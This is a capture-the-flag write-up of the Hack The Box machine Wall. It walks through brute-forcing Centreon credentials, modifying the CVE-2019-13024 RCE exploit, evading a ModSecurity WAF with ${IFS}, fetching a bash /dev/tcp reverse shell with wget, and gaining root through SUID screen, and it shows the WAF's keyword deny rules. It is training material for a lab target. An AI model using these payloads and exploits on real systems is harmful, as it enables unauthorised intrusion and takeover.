---
title: HTB: Wall
url: https://0xdf.gitlab.io/2019/12/07/htb-wall.html
date: 2019-12-07T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-wall, nmap, gobuster, hydra, centreon, cve-2019-13024, waf, filter, python, uncompyle6, screen, modsecurity, htaccess, htb-flujab
---

![Wall](https://0xdfimages.gitlab.io/img/wall-cover.png)

Wall presented a series of challenges wrapped around two public exploits. The first exploit was a CVE in Centreon software. But to find it, I had to take advantage of a misconfigured webserver that only requests authenticatoin on GET requests, allowing POST requests to proceed, which leads to the path to the Centreon install. Next, I’ll use the public exploit, but it fails because there’s a WAF blocking requests with certain keywords. I’ll probe to identify the blocks words, which includes the space character, and use the Linux environment variable ${IFS} instead of space to get command injection. Once I have that, I can get a shell on the box. There’s a compiled Python file in the users home directory, which I can decompile to find the password for the second user. From either of these users, I can exploit SUID screen to get a root shell. In Beyond Root, I’ll look at the webserver configuration, the WAF, improve the exploit script, and look at some trolls the author left around.

## Box Info

| Name | [Wall](https://hackthebox.com/machines/wall)  [Wall](https://hackthebox.com/machines/wall) [Play on HackTheBox](https://hackthebox.com/machines/wall) |
| --- | --- |
| Release Date | [14 Sep 2019](https://twitter.com/hackthebox_eu/status/1172496633524903936) |
| Retire Date | 07 Dec 2019 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Wall |
| Radar Graph | Radar chart for Wall |
| First Blood User | 02:17:37[qtc qtc](https://app.hackthebox.com/users/103578) |
| First Blood Root | 02:17:18[qtc qtc](https://app.hackthebox.com/users/103578) |
| Creator | [askar askar](https://app.hackthebox.com/users/17292) |

## Recon

### nmap

`nmap` returns a very typical combination of services, ssh (22) and http (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.157
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-14 15:02 EDT
Warning: 10.10.10.157 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.157
Host is up (0.19s latency).
Not shown: 42968 closed ports, 22565 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 54.94 seconds
root@kali# nmap -sC -sV -p 22,80 -oA scans/nmap-tcpscripts 10.10.10.157 
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-14 15:03 EDT
Nmap scan report for 10.10.10.157
Host is up (0.071s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.41 seconds

```

[Apache](https://packages.ubuntu.com/search?keywords=apache2) and [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versions both point to Ubuntu Bionic (18.04).

### Website - TCP 80

#### Site

Gives a default Apache page:

![1568527824387](https://0xdfimages.gitlab.io/img/1568527824387.png)

#### Directory Brute Force

`gobuster` returns a couple paths / files:

```

root@kali# gobuster dir -u http://10.10.10.157 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.157
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2019/09/14 15:06:07 Starting gobuster
===============================================================
/aa.php (Status: 200)
/monitoring (Status: 401)
/panel.php (Status: 200)
/server-status (Status: 403)
===============================================================
2019/09/14 15:53:08 Finished
===============================================================

```

#### php Pages

Both `aa.php` and `panel.php` don’t return anything interesting:

```

root@kali# curl 10.10.10.157/aa.php
1
root@kali# curl 10.10.10.157/panel.php
Just a test for php file !

```

Because there was no where else to look, I spent some time trying to fuzz parameters at both of these. I didn’t discover any parameters for GET or POST, but I did see some 403s come back when I posted:

```

root@kali# wfuzz -c -u http://10.10.10.157/panel.php -d 'FUZZ=0xdf' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 26
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.157/panel.php
Total requests: 2588

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000160:   403        11 L     32 W     296 Ch      "hostname"
000000435:   403        11 L     32 W     296 Ch      "passwd"

Total time: 28.51029
Processed Requests: 2588
Filtered Requests: 2586
Requests/sec.: 90.77422

```

In fact, when I post with either of these phrases to even static pages, it comes back 403:

```

root@kali# curl http://10.10.10.157 -d "hostname"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /
on this server.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.10.157 Port 80</address>
</body></html>

```

So there is some kind of web application firewall (WAF) running here.

#### /monitoring

Visiting `/monitoring` prompts for basic auth:

![1568528472082](https://0xdfimages.gitlab.io/img/1568528472082.png)

I’ll take a hint from the prompt that the username is admin. Finding nothing else, I did kick off a `hydra` run against the form:

```

root@kali# hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.157 http-get /monitoring/
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-15 02:22:39
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
[DATA] attacking http-get://10.10.10.157:80/monitoring/
[STATUS] 3019.00 tries/min, 3019 tries in 00:01h, 6981 to do in 00:03h, 16 active
[STATUS] 3039.50 tries/min, 6079 tries in 00:02h, 3921 to do in 00:02h, 16 active
[STATUS] 3046.00 tries/min, 9138 tries in 00:03h, 862 to do in 00:01h, 16 active
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-14 16:26:06

```

While that was running, I did try a post to the path, and it resolved!

```

root@kali# curl -X POST http://10.10.10.157/monitoring/
<h1>This page is not ready yet !</h1>
<h2>We should redirect you to the required page !</h2>

<meta http-equiv="refresh" content="0; URL='/centreon'" />

```

It’s a redirect to `/centreon`.

#### /centreon

Unsurprisingly this path is running an instance of [Centreon](https://www.centreon.com/en/), an open source infrastructure monitoring software:

![1568529023783](https://0xdfimages.gitlab.io/img/1568529023783.png)

Based on some googling for default creds, I tried all combinations of “centreon”, “admin”, and “root”, but didn’t get logged in.

## Shell as www-data

### Find Exploit

Some googling reveals that not only is there an [RCE exploit against Centreon v19.04](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13024), but it was [discovered by Wall’s creator](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)(who it seems forgot to renew his domain at the time of writing, here’s the [Google cached version](https://webcache.googleusercontent.com/search?q=cache:kIxQUrEq9A0J:https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/+&cd=1&hl=en&ct=clnk&gl=us&client=ubuntu)), and he has [exploit code on GitHub](https://github.com/mhaskar/CVE-2019-13024). That’s a pretty good clue that I’m in the right spot.

I’ll download the script and take a look. Unfortunately, this exploit requires authentication.

### Brute Force Creds

#### hydra

After significantly more enumeration looking for credentials, I set out to try to brute force my way into Centreon. But looking at the POST request to login, there’s a problem:

```

POST /centreon/index.php HTTP/1.1
Host: 10.10.10.157
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.157/centreon/
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Cookie: PHPSESSID=jc6r4ut6cq0e9nssnfk8dskaq0
Connection: close
Upgrade-Insecure-Requests: 1

useralias=admin&password=admin&submitLogin=Connect&centreon_token=8401dc563787157a951dfea15f0bcf44

```

The `centreon_token` parameter changes on each page load. On a failed login, I see:

```

<div class="error_msg"><span class='msg'>Your credentials are incorrect.</span></div>

```

But when I send it to repeater and submit again:

```

<div class='msg' align='center'>The form has not been submitted since 15 minutes. Please retry to resubmit<a href='' OnLoad = windows.location(); alt='reload'> here</a></div>

```

This is because the token isn’t right. That rules out something like `hydra`.

#### Exploit Script

Looking at the script, it uses `requests` to issue five HTTP requests:
- A GET to `/index.php` to add the php session cookie to the session and find the token.
- A POST to `/index.php` to login. If the login fails, it prints a message and exits.
- A GET to `/main.get.php?p=60901` to get a “Poller token”.
- A POST to `/main.get.php?p=60901` that includes the payload.
- A GET to `/include/configuration/configGenerate/xml/generateFiles.php` to trigger the payload.

I considered writing my own script to brute force the credentials, but this script already does what I want. I did add `features="lxml"` to each of the `BeautifulSoup` calls, otherwise there’s a lout error on running.

I’ll run a `bash` for loop over a list of passwords. For each password, I’ll run the exploit script, and pipe the output into `grep`. I see in the script that the first thing it does after a successful login is `print("[+] Logged In Sucssfully")`. So I’ll `grep` for that and then add `&& echo $pass && break`. That means that if the `grep` is successful, it will echo the password that worked, and then end the loop.

All of that runs and gets the password in about four minutes using the `twitter-banned.txt` password list:

```

root@kali# time for pass in $(cat /usr/share/wordlists/seclists/Passwords/twitter-banned.txt); do ./centreon-exploit.py http://10.10.10.157/centreon admin $pass 10.10.14.30 443 | grep "Logged In" && echo $pass && break; done
[+] Logged In Sucssfully
password1

real    3m49.380s
user    2m22.758s
sys     0m14.211s

```

#### API

An even better way to do this brute force is to use the [Centreon API](https://documentation.centreon.com/docs/centreon/en/latest/api/api_rest/index.html#authentication). Based on that documentation, I can attempt authentication using the following `curl`:

```

root@kali# curl 10.10.10.157/centreon/api/index.php?action=authenticate -d "username=admin&password=admin"
"Bad credentials"

```

I can do a similar bash loop, and this time it finds the password in less than a minute:

```

root@kali# time for pass in $(cat /usr/share/wordlists/seclists/Passwords/twitter-banned.txt); do curl -s 10.10.10.157/centreon/api/index.php?action=authenticate -d "username=admin&password=${pass}" | grep authToken && echo $pass && break; done
{"authToken":"UZVQydKGAqV5v7YfpfHNDepxax\/QiCGW5iiqGOw0iX8="}
password1

real    0m55.771s
user    0m3.379s
sys     0m2.262s

```

### Exploit Fails

Armed with the creds, I opened a `nc` listener and ran the exploit script:

```

root@kali# ./centreon-exploit.py http://10.10.10.157/centreon/ admin password1 10.10.14.30 443
[+] Retrieving CSRF token to submit the login form
[+] Login token is : 77dc6f59344b11c223b864e612c90cac
[+] Logged In Sucssfully
[+] Retrieving Poller token
[+] Poller token is : e76df3722b39e59e312024617c21b801
[+] Injecting Done, triggering the payload
[+] Check you netcat listener !

```

It seemed to work fine, but I didn’t get a shell.

I opened the script back up, and took a look at the section where the payload is sent:

```

    payload_info = {
        "name": "Central",
        "ns_ip_address": "127.0.0.1",
        # this value should be 1 always
        "localhost[localhost]": "1",
        "is_default[is_default]": "0",
        "remote_id": "",
        "ssh_port": "22",
        "init_script": "centengine",
        # this value contains the payload , you can change it as you want
        "nagios_bin": "ncat -e /bin/bash {0} {1} #".format(ip, port),
        "nagiostats_bin": "/usr/sbin/centenginestats",
        "nagios_perfdata": "/var/log/centreon-engine/service-perfdata",
        "centreonbroker_cfg_path": "/etc/centreon-broker",
        "centreonbroker_module_path": "/usr/share/centreon/lib/centreon-broker",
        "centreonbroker_logs_path": "",
        "centreonconnector_path": "/usr/lib64/centreon-connector",
        "init_script_centreontrapd": "centreontrapd",
        "snmp_trapd_path_conf": "/etc/snmp/centreon_traps/",
        "ns_activate[ns_activate]": "1",
        "submitC": "Save",
        "id": "1",
        "o": "c",
        "centreon_token": poller_token,
    }

    send_payload = request.post(poller_configuration_page, payload_info)
    print("[+] Injecting Done, triggering the payload")

```

There’s a lot to not like about the way this exploit is written. The payload relies on the insecure `nc` with `-e` being on the target, and there’s no error checking. I added a print statement just above the last one to print the `send_payload.status_code`, and ran again:

```

root@kali# ./centreon-exploit.py http://10.10.10.157/centreon/ admin password1 10.10.14.30 443
[+] Retrieving CSRF token to submit the login form
[+] Login token is : 6e9b4561b4c05180b23c8d0b854ed7a0
[+] Logged In Sucssfully
[+] Retrieving Poller token
[+] Poller token is : 720954a0f1742c2428b9fc9c8c00a670
[*] Payload inject status code: 403
[+] Injecting Done, triggering the payload
[+] Check you netcat listener !

```

That’s why it’s failing. The injection POST is being blocked by the WAF.

I emptied out the payload line:

```

        # this value contains the payload , you can change it as you want
        #"nagios_bin": "ncat -e /bin/bash {0} {1} #".format(ip, port),
        "nagios_bin": "",

```

And ran again:

```

root@kali# ./centreon-exploit.py http://10.10.10.157/centreon/ admin password1 10.10.14.30 443
[+] Retrieving CSRF token to submit the login form
[+] Login token is : fe57a7dc6569207997e51a35b33e7a4a
[+] Logged In Sucssfully
[+] Retrieving Poller token
[+] Poller token is : 4654f45a045a9fea5c86d690ae9f02bc
[*] Payload inject status code: 200
[+] Injecting Done, triggering the payload
[+] Check you netcat listener !

```

It was passed through. Obviously I didn’t get code execution, but now I have a clear task to find a payload that bypasses the WAF and returns a shell.

### Script Update

I decided to update the exploit script to better suit the task. I wasn’t a huge fan of having a `ncat -e` payload in there to begin with, as it’s more likely than not that `-e` won’t be available. I changed the script so that rather than trying to force a specific reverse shell, it takes a command to run. The top looks like:

```

if len(sys.argv) != 5:
    print(len(sys.argv))
    print("[~] Usage : ./centreon-exploit.py url username password command")
    exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
command = sys.argv[4]

```

And in the middle, I replaced:

```

"nagios_bin": "ncat -e /bin/bash {0} {1} #".format(ip, port),

```

with:

```

"nagios_bin": command,

```

That was good enough as far as script upgrades to get a shell. But I did play with it some more, which I’ll talk about in [Beyond Root](#script-upgrades).

### WAF Testing

I knew that `hostname` triggered the WAF earlier on this box. It does here as well:

```

root@kali# ./centreon-0xdf.py http://10.10.10.157/centreon/ admin password1 "hostname"
[+] Retrieving CSRF token to submit the login form
[+] Login token is : 394206ab8aca7d49e54f2cd3a4a3bd1d
[+] Logged In Sucssfully
[+] Retrieving Poller token
[+] Poller token is : 2cbdf5f8ce42cbeebde67e8925bfc04b
[*] Payload inject status code: 403
[+] Injecting Done, triggering the payload
[+] Check you netcat listener !

```

So I started checking different commands. `nc` gave a 403, but `curl` and `wget` were good. Armed with those, I wanted to see if I could create a connection back. I ran `python3 -m http.server 80` and then issued `wget 10.10.14.30`. It returned 403.

My first thought was that it was blocking on IP addresses. So I tried `wget wget`, but it still failed. I tried `wget`  (there’s a space at the end), and it returned 403! It seems that space is blocked at the firewall. This is a pretty unrealistic challenge, and I suspect completely breaks the Centreon application. But I’ll continue.

I know a way to say space without using that character is the `${IFS}` variable. I’ll give it a try, making sure to put my payload in single quotes so that my bash doesn’t evaluate the variable:

```

root@kali# ./centreon-0xdf.py http://10.10.10.157/centreon/ admin password1 'wget${IFS}10.10.14.30'
[+] Retrieving CSRF token to submit the login form
[+] Login token is : c3e06f0952f4b5ed743cf4be0a4434a0
[+] Logged In Sucssfully
[+] Retrieving Poller token
[+] Poller token is : ed900e21690e570728e12e1cba70c926
[*] Payload inject status code: 200
[+] Injecting Done, triggering the payload
[+] Check you netcat listener !

```

And I get a request on my webserver:

```
10.10.10.157 - - [15/Sep/2019 04:49:43] "GET / HTTP/1.1" 200 -

```

I wrote a quick reverse shell script:

```

root@kali# cat shell
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.30/443 0>&1

```

I tried to get `wget` to output to stdout and pipe that into `bash`, but i couldn’t get that to work. But I did get this to work:

```

wget${IFS}10.10.14.30/shell${IFS}-O${IFS}/tmp/0xdf;${IFS}bash${IFS}-i${IFS}/tmp/0xdf

```

This uses `wget` to get the shell file and save it to `/tmp`, and then use `bash` to run it.

```

root@kali# ./centreon-0xdf.py http://10.10.10.157/centreon/ admin password1 'wget${IFS}10.10.14.30/shell${IFS}-O${IFS}/tmp/0xdf;${IFS}bash${IFS}-i${IFS}/tmp/0xdf'
[+] Retrieving CSRF token to submit the login form
[+] Login token is : 1892910fb24da4dd4d54fabd156f46fe
[+] Logged In Sucssfully
[+] Retrieving Poller token
[+] Poller token is : 71d739093f67a73ed21c823778f3f052
[*] Payload inject status code: 200
[+] Injecting Done, triggering the payload
[+] Check you netcat listener !

```

Hits on webserver:

```
10.10.10.157 - - [15/Sep/2019 05:34:00] "GET /shell HTTP/1.1" 200 - 

```

And then shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.157.
Ncat: Connection from 10.10.10.157:35064.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Wall:/usr/local/centreon/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)

```

I can see `user.txt`, but I can’t read it:

```

www-data@Wall:/home/shelby$ ls -l 
total 12
-rw-rw-r-- 1 shelby shelby 4567 Jul 30 17:37 html.zip
-rw------- 1 shelby shelby   33 Jul  4 01:22 user.txt

```

## Priv: www-data –> shelby

### Enumeration

In `/opt`, there’s a hidden directory:

```

www-data@Wall:/opt$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Jul  4 17:28 .
drwxr-xr-x 23 root root 4096 Jul  4 00:25 ..
drwxr-xr-x  2 root root 4096 Jul 30 17:39 .shelby

```

It has a single file, which is a python byte compiled program:

```

www-data@Wall:/opt/.shelby$ file backup 
backup: python 2.7 byte-compiled

```

I can run it:

```

www-data@Wall:/opt/.shelby$ python backup 
[+] Done !

```

But I can’t read it in its current form:

```

www-data@Wall:/opt/.shelby$ cat backup 

^V@]c@stddlZdZdZdZejeefZdZeed7Zeed7Zee7Zeed     7Zeed
7Zeed
     7Zeed
7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zeed7Zej dedeej
j
 eZ
   e
ddGHdS(iNtshelbywall.htbittSthtetltbtytPtatstwt@trtdtItttotntgt!usernamepasswords/var/www/html.ziphtml.zips
[+] Done !(paramikoRthosttportt Transportt      transportRtchrtordtconnectt
SFTPClienttfrom_transportt
                          sftp_clienttput(((s   backup.py<module>s@

```

### Decode pyc

I’ll use [uncompyle6](https://pypi.org/project/uncompyle6/) to decode the byte code back into Python. First, I’ll install it with `pip install uncompyle6`. Then, I’ll move the `backup` back to my box with `nc`.

Now run it:

```

root@kali# uncompyle6 backup.pyc
# uncompyle6 version 3.4.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.16 (default, Apr  6 2019, 01:42:57)
# [GCC 8.3.0]
# Embedded file name: backup.py
# Compiled at: 2019-07-30 10:38:22
import paramiko
username = 'shelby'
host = 'wall.htb'
port = 22
transport = paramiko.Transport((host, port))
password = ''
password += chr(ord('S'))
password += chr(ord('h'))
password += chr(ord('e'))
password += chr(ord('l'))
password += chr(ord('b'))
password += chr(ord('y'))
password += chr(ord('P'))
password += chr(ord('a'))
password += chr(ord('s'))
password += chr(ord('s'))
password += chr(ord('w'))
password += chr(ord('@'))
password += chr(ord('r'))
password += chr(ord('d'))
password += chr(ord('I'))
password += chr(ord('s'))
password += chr(ord('S'))
password += chr(ord('t'))
password += chr(ord('r'))
password += chr(ord('o'))
password += chr(ord('n'))
password += chr(ord('g'))
password += chr(ord('!'))
transport.connect(username=username, password=password)
sftp_client = paramiko.SFTPClient.from_transport(transport)
sftp_client.put('/var/www/html.zip', 'html.zip')
print '[+] Done !'
# okay decompiling backup.pyc

```

Basically, the file is using `paramiko` to connect to Wall, and put `html.zip` in place. It builds the password one character at a time, presumably so that it’s not in the strings of the file. But this provides an ssh password for shelby, “ShelbyPassw@rdIsStrong!”

```

root@kali# python -c "password = ''
> password += chr(ord('S'))
> password += chr(ord('h'))
> password += chr(ord('e'))
> password += chr(ord('l'))
> password += chr(ord('b'))
> password += chr(ord('y'))
> password += chr(ord('P'))
> password += chr(ord('a'))
> password += chr(ord('s'))
> password += chr(ord('s'))
> password += chr(ord('w'))
> password += chr(ord('@'))
> password += chr(ord('r'))
> password += chr(ord('d'))
> password += chr(ord('I'))
> password += chr(ord('s'))
> password += chr(ord('S'))
> password += chr(ord('t'))
> password += chr(ord('r'))
> password += chr(ord('o'))
> password += chr(ord('n'))
> password += chr(ord('g'))
> password += chr(ord('!'))
> print password"
ShelbyPassw@rdIsStrong!

```

### SSH as shelby

Now I can connect over SSH as shelby:

```

root@kali# ssh shelby@10.10.10.157
shelby@10.10.10.157's password:
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-54-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Jul 30 17:36:33 2019 from 192.168.178.1
shelby@Wall:~$

```

And I can grab `user.txt`:

```

shelby@Wall:~$ cat user.txt
fe619454************************

```

## Priv: shelby –> root

### Enumeration

When I run [LinEnum](https://github.com/rebootuser/LinEnum), I always use `-t` for thorough tests. This includes SUID binaries. When I saw those results, `screen` jumped out at me as interesting and non-default:

```

[-] SUID files:
-rwsr-xr-x 1 root root 43088 Oct 15  2018 /bin/mount
-rwsr-xr-x 1 root root 64424 Mar 10  2017 /bin/ping
-rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44664 Mar 22 21:05 /bin/su
-rwsr-xr-x 1 root root 26696 Oct 15  2018 /bin/umount
-rwsr-xr-x 1 root root 44528 Mar 22 21:05 /usr/bin/chsh
-rwsr-xr-x 1 root root 59640 Mar 22 21:05 /usr/bin/passwd
-rwsr-xr-x 1 root root 75824 Mar 22 21:05 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 18448 Mar 10  2017 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 76496 Mar 22 21:05 /usr/bin/chfn
-rwsr-xr-x 1 root root 40344 Mar 22 21:05 /usr/bin/newgrp
-rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo
-rwsr-xr-- 1 root messagebus 42992 Jun 10 21:05 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-r-sr-xr-x 1 root root 13628 Aug 28 14:41 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14320 Aug 28 14:41 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device    

```

The binary is executable by all users, so there’s actually nothing to stop me from doing this exploit from www-data (that’s actually what I did when the box was live).

### Exploit

`screen` jumps out because I’ve already done a privesc against `screen` in HTB, in [FluJab](/2019/06/15/htb-flujab.html#priv-drno--root). This case is easier, as there is a compiler on the box:

```

www-data@Wall:/$ which gcc
/usr/bin/gcc

```

I’ll grab the shell script from the [screen2root repo](https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh), and save it in `/dev/shm` as `.a.sh`. Now I run that, and get a shell:

```

www-data@Wall:/dev/shm$ bash .a.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function 'dropshell':
/tmp/libhax.c:7:5: warning: implicit declaration of function 'chmod'; did you mean 'chroot'? [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^~~~~
     chroot
/tmp/rootshell.c: In function 'main':
/tmp/rootshell.c:3:5: warning: implicit declaration of function 'setuid'; did you mean 'setbuf'? [-Wimplicit-function-declaration]
     setuid(0);
     ^~~~~~
     setbuf
/tmp/rootshell.c:4:5: warning: implicit declaration of function 'setgid'; did you mean 'setbuf'? [-Wimplicit-function-declaration]
     setgid(0);
     ^~~~~~
     setbuf
/tmp/rootshell.c:5:5: warning: implicit declaration of function 'seteuid'; did you mean 'setbuf'? [-Wimplicit-function-declaration]
     seteuid(0);
     ^~~~~~~
     setbuf
/tmp/rootshell.c:6:5: warning: implicit declaration of function 'setegid' [-Wimplicit-function-declaration]
     setegid(0);
     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function 'execvp' [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^~~~~~
/usr/bin/ld: cannot open output file /tmp/rootshell: Permission denied
collect2: error: ld returned 1 exit status
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)

```

I can grab `root.txt` (and `user.txt` if I hadn’t already):

```

root@Wall:/root# cat root.txt
1fdbcf8c************************

```

## Beyond Root

### Basic Auth

I managed to find the `/centreon` path by posting to `/monitoring` when it was asking for auth on a GET, and it let me through. Once I got a shell, I took a look at the web directory:

```

www-data@Wall:/var/www/html$ find .
.
./aa.php
./index.html
./panel.php
./monitoring
./monitoring/index.html
./monitoring/.htaccess

```

It’s the `.htaccess` page that defines the restrictions:

```

www-data@Wall:/var/www/html$ cat monitoring/.htaccess 
AuthUserFile /etc/.htpasswd
AuthName "Protected area by the admin"
AuthType Basic
<Limit GET>
require valid-user
</Limit>

```

It only has a limit on GET requests, not POST, which is why the POST request goes through. Typically this would be written like:

```

<Limit GET POST PUT>
require valid-user
</Limit>

```

### ModSecurity

[ModSecurity](https://modsecurity.org/) is an open source WAF. In this case, it’s loaded into `apache`. Configuration files for enabled `apache` modules are in `/etc/apache2/mods-enabled/`:

```

root@Wall:/etc/apache2/mods-enabled# ls *.conf          
alias.conf      mime.conf         proxy.conf       status.conf
autoindex.conf  mpm_prefork.conf  reqtimeout.conf
deflate.conf    negotiation.conf  security2.conf
dir.conf        php7.3.conf       setenvif.conf

```

`security2.conf` shows the ModSecurity config:

```

root@Wall:/etc/apache2/mods-enabled# cat security2.conf 
<IfModule security2_module>
        # Default Debian dir for modsecurity's persistent data
        SecDataDir /var/cache/modsecurity

        # Include all the *.conf files in /etc/modsecurity.
        # Keeping your local configuration in that directory
        # will allow for an easy upgrade of THIS file and
        # make your life easier
        IncludeOptional /etc/modsecurity/*.conf

        # Include OWASP ModSecurity CRS rules if installed
        #IncludeOptional /usr/share/modsecurity-crs/owasp-crs.load
</IfModule>

```

It’s mostly comments, but it includes all the `.conf` files in `/etc/modsecurity/`. There’s only one:

```

root@Wall:/etc/modsecurity# ls *.conf
modsecurity.conf

```

It contains rules for the things I had noticed were blocked:

```

root@Wall:/etc/modsecurity# cat modsecurity.conf
SecRuleEngine On
SecRequestBodyAccess On

# block nc word
SecRule REQUEST_BODY "\bnc\b" "id:00001,deny,msg:'blocked'"

# block ncat word
SecRule REQUEST_BODY "\bncat\b" "id:00002,deny,msg:'blocked'"

# block passwd word
SecRule REQUEST_BODY "\bpasswd\b" "id:00003,deny,msg:'blocked'"

# block # char
SecRule REQUEST_BODY "%23" "id:00004,deny,msg:'blocked'"

# block any whitespace
SecRule REQUEST_BODY "\+" "id:00005,deny,msg:'blocked'"

# block hostname word
SecRule REQUEST_BODY "\bhostname\b" "id:00006,deny,msg:'blocked'"

```

It’s blocking `nc`, `ncat`, `passwd`, `#`, `+`, and `hostname`. I’ll notice all of these rules are looking at the REQUEST\_BODY.

### Script Upgrades

Working the box, I needed to make the script able to take commands that I gave it at the command line so that I could bypass the WAF and get a shell. But I did take it a bit further:
1. Integrate substitution for space so that I don’t have to type `${IFS}`.
2. Get output of commands.
3. Add error handling for WAF failures.

First, I added a simple upgrade to the payload to get around the WAF, at least for the space, by changing the payload to:

```

command = sys.argv[4].replace(' ', '${IFS}')

```

Next, I noticed in the blog post that he was able to read the output of his commands. I also noticed that the injection is into a PHP `shell_exec`, where my input string is at the front of the input. In the blog post, he ends his payload with a `#`, which is a comment. But it’s also a character that triggers the WAF. Another thing I could add to the end of my string is `||`, or logical or. This means that assuming my command succeeds, it won’t run what comes next. I added that into the payload:

```

"nagios_bin": f'{command}||'

```

Now I can see the output when I send the second POST. I’ll add some regex to extract the results, as well as some error handling.

The resulting code is:

```

#!/usr/bin/python3

'''
# Exploit Title: Centreon v19.04 authenticated Remote Code Execution
# Date: 28/06/2019
# Exploit Author: Askar (@mohammadaskar2):
# Modified By: 0xdf
# CVE : CVE-2019-13024
# Vendor Homepage: https://www.centreon.com/
# Version: v19.04
